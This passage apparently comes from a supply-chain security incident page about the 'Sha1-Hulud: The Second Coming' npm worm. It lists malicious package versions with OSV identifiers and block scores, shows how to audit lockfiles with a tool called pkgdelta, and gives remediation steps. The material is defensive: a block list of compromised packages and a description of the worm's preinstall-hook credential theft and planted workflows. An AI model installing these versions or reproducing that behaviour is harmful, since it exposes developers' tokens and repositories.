| `mcp-use` | 1.4.3 | 1.4.1 | [MAL-2025-190923](https://osv.dev/vulnerability/MAL-2025-190923) | BLOCK (20) | high_risk |
| `medusa-plugin-logs` | 0.0.17 | 0.0.16 | [MAL-2025-191128](https://osv.dev/vulnerability/MAL-2025-191128) | BLOCK (21) | high_risk |
| `medusa-plugin-momo` | 0.0.68 | 0.0.67 | [MAL-2025-190850](https://osv.dev/vulnerability/MAL-2025-190850) | BLOCK (21) | high_risk |
| `medusa-plugin-product-reviews-kvy` | 0.0.4 | 0.0.3 | [MAL-2025-190776](https://osv.dev/vulnerability/MAL-2025-190776) | BLOCK (21) | high_risk |
| `medusa-plugin-zalopay` | 0.0.40 | 0.0.39 | [MAL-2025-190851](https://osv.dev/vulnerability/MAL-2025-190851) | BLOCK (21) | high_risk |
| `mon-package-react-typescript` | 1.0.1 | 1.0.0 | [MAL-2025-190976](https://osv.dev/vulnerability/MAL-2025-190976) | BLOCK (21) | high_risk |
| `n8n-nodes-vercel-ai-sdk` | 0.1.7 | 0.1.6 | [MAL-2025-190977](https://osv.dev/vulnerability/MAL-2025-190977) | BLOCK (21) | high_risk |
| `n8n-nodes-viral-app` | 0.2.5 | 0.2.4 | [MAL-2025-191399](https://osv.dev/vulnerability/MAL-2025-191399) | BLOCK (21) | high_risk |
| `ngx-useful-swiper-prosenjit` | 9.0.2 | 9.0.1 | [MAL-2025-191129](https://osv.dev/vulnerability/MAL-2025-191129) | BLOCK (21) | high_risk |
| `ngx-wooapi` | 12.0.1 | 12.0.0 | [MAL-2025-191130](https://osv.dev/vulnerability/MAL-2025-191130) | BLOCK (21) | high_risk |
| `okta-react-router-6` | 5.0.1 | 5.0.0 | [MAL-2025-191137](https://osv.dev/vulnerability/MAL-2025-191137) | BLOCK (21) | high_risk |
| `orbit-boxicons` | 2.1.3 | 2.1.2 | [MAL-2025-190854](https://osv.dev/vulnerability/MAL-2025-190854) | BLOCK (21) | high_risk |
| `orbit-nebula-draw-tools` | 1.0.10 | 1.0.9 | [MAL-2025-190698](https://osv.dev/vulnerability/MAL-2025-190698) | BLOCK (21) | high_risk |
| `orbit-nebula-editor` | 1.0.2 | 1.0.1 | [MAL-2025-190777](https://osv.dev/vulnerability/MAL-2025-190777) | BLOCK (21) | high_risk |
| `orbit-soap` | 0.43.13 | 0.43.12 | [MAL-2025-190855](https://osv.dev/vulnerability/MAL-2025-190855) | BLOCK (21) | high_risk |
| `parcel-plugin-asset-copier` | 1.1.3 | 1.1.1 | [MAL-2025-190984](https://osv.dev/vulnerability/MAL-2025-190984) | BLOCK (21) | high_risk |
| `pdf-annotation` | 0.0.2 | 0.0.1 | [MAL-2025-190985](https://osv.dev/vulnerability/MAL-2025-190985) | BLOCK (21) | high_risk |
| `poper-react-sdk` | 0.1.2 | 0.1.1 | [MAL-2025-190856](https://osv.dev/vulnerability/MAL-2025-190856) | BLOCK (21) | high_risk |
| `posthog-docusaurus` | 2.0.6 | 2.0.5 | [MAL-2025-190924](https://osv.dev/vulnerability/MAL-2025-190924) | BLOCK (21) | high_risk |
| `posthog-js` | 1.297.3 | 1.297.2 | [MAL-2025-191402](https://osv.dev/vulnerability/MAL-2025-191402) | BLOCK (17) | high_risk |
| `posthog-node` | 4.18.1 | 4.18.0 | [MAL-2025-190925](https://osv.dev/vulnerability/MAL-2025-190925) | BLOCK (18) | high_risk |
| `posthog-node` | 5.11.3 | 5.11.2 | [MAL-2025-190925](https://osv.dev/vulnerability/MAL-2025-190925) | BLOCK (21) | high_risk |
| `posthog-node` | 5.13.3 | 5.13.2 | [MAL-2025-190925](https://osv.dev/vulnerability/MAL-2025-190925) | BLOCK (21) | high_risk |
| `posthog-react-native` | 4.11.1 | 4.11.0 | [MAL-2025-190926](https://osv.dev/vulnerability/MAL-2025-190926) | BLOCK (18) | high_risk |
| `posthog-react-native` | 4.12.5 | 4.12.4 | [MAL-2025-190926](https://osv.dev/vulnerability/MAL-2025-190926) | BLOCK (18) | high_risk |
| `prime-one-table` | 0.0.19 | 0.0.18 | [MAL-2025-190987](https://osv.dev/vulnerability/MAL-2025-190987) | BLOCK (21) | high_risk |
| `ra-data-firebase` | 1.0.8 | 1.0.6 | [MAL-2025-190864](https://osv.dev/vulnerability/MAL-2025-190864) | BLOCK (21) | high_risk |
| `react-element-prompt-inspector` | 0.1.18 | 0.1.17 | [MAL-2025-190699](https://osv.dev/vulnerability/MAL-2025-190699) | BLOCK (21) | high_risk |
| `react-jam-icons` | 1.0.2 | 1.0.0 | [MAL-2025-190991](https://osv.dev/vulnerability/MAL-2025-190991) | BLOCK (21) | high_risk |
| `react-keycloak-context` | 1.0.8 | 1.0.7 | [MAL-2025-190992](https://osv.dev/vulnerability/MAL-2025-190992) | BLOCK (21) | high_risk |
| `react-keycloak-context` | 1.0.9 | 1.0.7 | [MAL-2025-190992](https://osv.dev/vulnerability/MAL-2025-190992) | BLOCK (21) | high_risk |
| `react-library-setup` | 0.0.6 | 0.0.5 | [MAL-2025-190700](https://osv.dev/vulnerability/MAL-2025-190700) | BLOCK (21) | high_risk |
| `react-micromodal.js` | 1.0.2 | 1.0.0 | [MAL-2025-190994](https://osv.dev/vulnerability/MAL-2025-190994) | BLOCK (21) | high_risk |
| `react-native-email` | 2.1.1 | 2.1.0 | [MAL-2025-190996](https://osv.dev/vulnerability/MAL-2025-190996) | BLOCK (21) | high_risk |
| `react-native-get-pixel-dimensions` | 1.0.1 | 1.0.0 | [MAL-2025-190998](https://osv.dev/vulnerability/MAL-2025-190998) | BLOCK (21) | high_risk |
| `react-native-google-maps-directions` | 2.1.2 | 2.1.1 | [MAL-2025-190999](https://osv.dev/vulnerability/MAL-2025-190999) | BLOCK (21) | high_risk |
| `react-native-retriable-fetch` | 2.0.2 | 2.0.0 | [MAL-2025-191004](https://osv.dev/vulnerability/MAL-2025-191004) | BLOCK (21) | high_risk |
| `react-native-use-modal` | 1.0.3 | 1.0.2 | [MAL-2025-190779](https://osv.dev/vulnerability/MAL-2025-190779) | BLOCK (21) | high_risk |
| `react-native-view-finder` | 1.2.2 | 1.2.0 | [MAL-2025-191005](https://osv.dev/vulnerability/MAL-2025-191005) | BLOCK (21) | high_risk |
| `react-native-websocket` | 1.0.4 | 1.0.2 | [MAL-2025-191006](https://osv.dev/vulnerability/MAL-2025-191006) | BLOCK (21) | high_risk |
| `react-native-worklet-functions` | 3.3.3 | 3.3.2 | [MAL-2025-190857](https://osv.dev/vulnerability/MAL-2025-190857) | BLOCK (21) | high_risk |
| `rediff` | 1.0.5 | 1.0.4 | [MAL-2025-191416](https://osv.dev/vulnerability/MAL-2025-191416) | BLOCK (21) | high_risk |
| `rediff-viewer` | 0.0.7 | 0.0.6 | [MAL-2025-191417](https://osv.dev/vulnerability/MAL-2025-191417) | BLOCK (20) | high_risk |
| `redux-router-kit` | 1.2.3 | 1.2.1 | [MAL-2025-190780](https://osv.dev/vulnerability/MAL-2025-190780) | BLOCK (21) | high_risk |
| `shinhan-limit-scrap` | 1.0.3 | 1.0.2 | [MAL-2025-190782](https://osv.dev/vulnerability/MAL-2025-190782) | BLOCK (21) | high_risk |
| `skills-use` | 0.1.1 | 0.1.0 | [MAL-2025-190783](https://osv.dev/vulnerability/MAL-2025-190783) | BLOCK (21) | high_risk |
| `super-commit` | 1.0.1 | 1.0.0 | [MAL-2025-191015](https://osv.dev/vulnerability/MAL-2025-191015) | BLOCK (20) | high_risk |
| `tanstack-shadcn-table` | 1.1.5 | 1.1.4 | [MAL-2025-191018](https://osv.dev/vulnerability/MAL-2025-191018) | BLOCK (21) | high_risk |
| `tcsp` | 2.0.2 | 2.0.1 | [MAL-2025-191433](https://osv.dev/vulnerability/MAL-2025-191433) | BLOCK (21) | high_risk |
| `tcsp-draw-test` | 1.0.5 | 1.0.4 | [MAL-2025-191019](https://osv.dev/vulnerability/MAL-2025-191019) | BLOCK (21) | high_risk |
| `tcsp-test-vd` | 2.4.4 | 2.4.3 | [MAL-2025-191020](https://osv.dev/vulnerability/MAL-2025-191020) | BLOCK (21) | high_risk |
| `template-micro-service` | 1.0.3 | 1.0.1 | [MAL-2025-191022](https://osv.dev/vulnerability/MAL-2025-191022) | BLOCK (20) | high_risk |
| `test-hardhat-app` | 1.0.2 | 1.0.0 | [MAL-2025-190784](https://osv.dev/vulnerability/MAL-2025-190784) | BLOCK (21) | high_risk |
| `test-hardhat-app` | 1.0.3 | 1.0.0 | [MAL-2025-190784](https://osv.dev/vulnerability/MAL-2025-190784) | BLOCK (21) | high_risk |
| `test23112222-api` | 1.0.1 | 1.0.0 | [MAL-2025-191434](https://osv.dev/vulnerability/MAL-2025-191434) | BLOCK (21) | high_risk |
| `tiaan` | 1.0.2 | 1.0.1 | [MAL-2025-191024](https://osv.dev/vulnerability/MAL-2025-191024) | BLOCK (21) | high_risk |
| `undefsafe-typed` | 1.0.3 | 1.0.2 | [MAL-2025-190937](https://osv.dev/vulnerability/MAL-2025-190937) | BLOCK (21) | high_risk |
| `undefsafe-typed` | 1.0.4 | 1.0.2 | [MAL-2025-190937](https://osv.dev/vulnerability/MAL-2025-190937) | BLOCK (21) | high_risk |
| `url-encode-decode` | 1.0.1 | 1.0.0 | [MAL-2025-190940](https://osv.dev/vulnerability/MAL-2025-190940) | BLOCK (21) | high_risk |
| `web-scraper-mcp` | 1.1.4 | 1.1.3 | [MAL-2025-190943](https://osv.dev/vulnerability/MAL-2025-190943) | BLOCK (20) | high_risk |
| `zapier-async-storage` | 1.0.1 | 1.0.0 | [MAL-2025-190788](https://osv.dev/vulnerability/MAL-2025-190788) | BLOCK (21) | high_risk |
| `zapier-async-storage` | 1.0.2 | 1.0.0 | [MAL-2025-190788](https://osv.dev/vulnerability/MAL-2025-190788) | BLOCK (21) | high_risk |
| `zapier-platform-cli` | 18.0.2 | 18.0.1 | [MAL-2025-190703](https://osv.dev/vulnerability/MAL-2025-190703) | BLOCK (18) | high_risk |
| `zapier-platform-cli` | 18.0.3 | 18.0.1 | [MAL-2025-190703](https://osv.dev/vulnerability/MAL-2025-190703) | BLOCK (18) | high_risk |
| `zapier-platform-core` | 18.0.2 | 18.0.1 | [MAL-2025-190704](https://osv.dev/vulnerability/MAL-2025-190704) | BLOCK (21) | high_risk |
| `zapier-platform-core` | 18.0.3 | 18.0.1 | [MAL-2025-190704](https://osv.dev/vulnerability/MAL-2025-190704) | BLOCK (21) | high_risk |
| `zapier-platform-legacy-scripting-runner` | 4.0.3 | 4.0.1 | [MAL-2025-190928](https://osv.dev/vulnerability/MAL-2025-190928) | BLOCK (19) | high_risk |
| `zapier-platform-schema` | 18.0.3 | 18.0.1 | [MAL-2025-190705](https://osv.dev/vulnerability/MAL-2025-190705) | BLOCK (21) | high_risk |
| `zuper-cli` | 1.0.1 | 1.0.0-beta | [MAL-2025-190789](https://osv.dev/vulnerability/MAL-2025-190789) | BLOCK (21) | high_risk |
| `zuper-sdk` | 1.0.57 | 1.0.56 | [MAL-2025-191156](https://osv.dev/vulnerability/MAL-2025-191156) | BLOCK (20) | high_risk |
| `zuper-stream` | 2.0.9 | 2.0.8 | [MAL-2025-190862](https://osv.dev/vulnerability/MAL-2025-190862) | BLOCK (19) | high_risk |

</details>
<!-- numbers:end -->

## Am I affected?

```
pip install git+https://github.com/thejusdutt/pkgdelta
pkgdelta audit package-lock.json      # or pnpm-lock.yaml / yarn.lock
```

`audit` checks every locked version against its previous release and asks [OSV](https://osv.dev) whether it is known malware, so versions npm has since deleted still fail. The full list is below.

If one of these versions was installed, the preinstall hook ran. Rotate every npm and GitHub token and cloud key that machine or CI job could read, look for public repositories on your GitHub account described as "Sha1-Hulud: The Second Coming", remove any `discussion.yaml` workflow you didn't write, and check your self-hosted runners.

Earlier: [Shai-Hulud](shai-hulud.md) (September 2025). Later, same family: [TanStack / Mini Shai-Hulud](tanstack-mini-shai-hulud.md), [ChainDrop](chaindrop-keyv.md). All incidents: [index](README.md).
